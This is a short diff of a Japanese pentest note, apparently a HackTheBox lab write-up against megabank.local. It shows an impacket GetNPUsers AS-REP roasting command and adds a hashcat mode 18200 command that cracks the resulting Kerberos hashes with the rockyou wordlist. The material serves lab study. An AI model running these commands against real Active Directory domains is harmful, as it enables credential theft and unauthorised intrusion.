@@ -7,6 +7,12 @@ ASREPRoast攻撃により**Kerberos事前認証が不要**なユーザーを探�
 └─$ GetNPUsers.py megabank.local/ -usersfile users.txt -format hashcat -outputfile hash.txt -no-pass -dc-ip 10.10.10.169
 ```
 
+**krb5asrep**タイプのハッシュをクラック：
+
+```
+┌──(kali㉿kali)-[~]                                                                                                                                                                                              
+└─$ hashcat -a 0 -m 18200 hashfile /usr/share/wordlists/rockyou.tx
+```
 
 ## Blood Hound from "LOCAL"
 
